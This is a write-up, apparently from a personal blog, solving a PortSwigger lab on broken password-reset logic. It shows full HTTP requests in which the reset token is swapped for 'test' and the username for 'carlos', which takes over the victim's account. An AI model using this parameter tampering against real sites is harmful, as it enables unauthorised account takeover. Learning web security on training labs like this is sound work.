# Lab: Password reset broken logic

[Lab: Password reset broken logic](https://portswigger.net/web-security/learning-paths/authentication-vulnerabilities/vulnerabilities-in-other-authentication-mechanisms/authentication/other-mechanisms/lab-password-reset-broken-logic)

Let's break some password reset functionality (one of my favorite features ever... to hack.)

# Thought Process

- After the usual prep work, My first step is to gather some more information about how vulnerable is the password reset functionality because the lab provides no information about this. So I'll try to reset my the password of my own account `wiener` and see how bad it is.

- I went to the reset password page and noticed that it takes either a `username` or an `email`. A bit weak as it makes our job super simple by providing the victim's username; `carlos` instead of having to do the extra work of getting the victim's email address.

- After sending myself a reset password request, I was sent an email to reset my password. The link of the reset password page was: `https://0ad3001a048f88ff820b1a0500ab00c4.web-security-academy.net/forgot-password?temp-forgot-password-token=3yz1i3ttgreby0vmt0djtoo9av98c60i`

- Alright, looks like `3yz1i3ttgreby0vmt0djtoo9av98c60i` is a token of some sorts. Let's investigate it a bit further.

- Using [CyberChef](https://gchq.github.io/CyberChef/) yields no results.

- Trying [Crack Station](https://crackstation.net/) also yields no results regarding this token. Hmm..

- I spent a bit of time trying to see if this token is weak but then decided to drop the token for now and look for other angles. What if I'm trying to hard option first while the easy option is simply right in front of me?

- I submitted the request to reset my own password and immediately something stood out to me;

```
POST /forgot-password?temp-forgot-password-token=3yz1i3ttgreby0vmt0djtoo9av98c60i HTTP/2
Host: 0ad3001a048f88ff820b1a0500ab00c4.web-security-academy.net
Cookie: session=Z79NUJLVFJnsLCq852kiUIlBwDsNMvEj
Content-Length: 117
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Dnt: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
Origin: https://0ad3001a048f88ff820b1a0500ab00c4.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ad3001a048f88ff820b1a0500ab00c4.web-security-academy.net/forgot-password?temp-forgot-password-token=3yz1i3ttgreby0vmt0djtoo9av98c60i
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ar;q=0.8
Priority: u=0, i

temp-forgot-password-token=3yz1i3ttgreby0vmt0djtoo9av98c60i&username=wiener&new-password-1=peter&new-password-2=peter
```

Looking at this, Looks like the `temp-forgot-password-token` is repeated in the URL and the body of the reuqest. Also, the username is passed along the request..! Looks like we're on the right track here.

- I sent this request to Burp Suite's repeater and edited the request to be:

```
POST /forgot-password?temp-forgot-password-token=test HTTP/2
Host: 0ad3001a048f88ff820b1a0500ab00c4.web-security-academy.net
Cookie: session=Z79NUJLVFJnsLCq852kiUIlBwDsNMvEj
Content-Length: 89
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Dnt: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
Origin: https://0ad3001a048f88ff820b1a0500ab00c4.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ad3001a048f88ff820b1a0500ab00c4.web-security-academy.net/forgot-password?temp-forgot-password-token=3yz1i3ttgreby0vmt0djtoo9av98c60i
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ar;q=0.8
Priority: u=0, i

temp-forgot-password-token=test&username=carlos&new-password-1=peter&new-password-2=peter
```

- We're just sending a `test` token in both URL and body, and we changed the username to `carlos` which is our victim's username.

- Oh man;

```
HTTP/2 302 Found
Location: /
X-Frame-Options: SAMEORIGIN
Content-Length: 0

```

- LOL it worked! It's actually this simple. I learnt a valuable lesson this lab, more than hacking this, is that I shouldn't jump to the hard route without trying the simplest routes first. It was acutally super simple and I could've saved myself some time of my *PRECIOUS* life.

- Well that's it lol, let's login to Carlos' account using `carlos:peter` and VOILA, we solved the lab.

- Something SUPER COOL I noticed is that the email address of carlos is: `carlos@carlos-montoya.net`. I got curious about that domain [carlos-montoya.net](https://carlos-montoya.net) so I actually visited it.

- Turns out it's a vulnerable web app that PortSwigger has set up to let us test hacking website. Just super cool.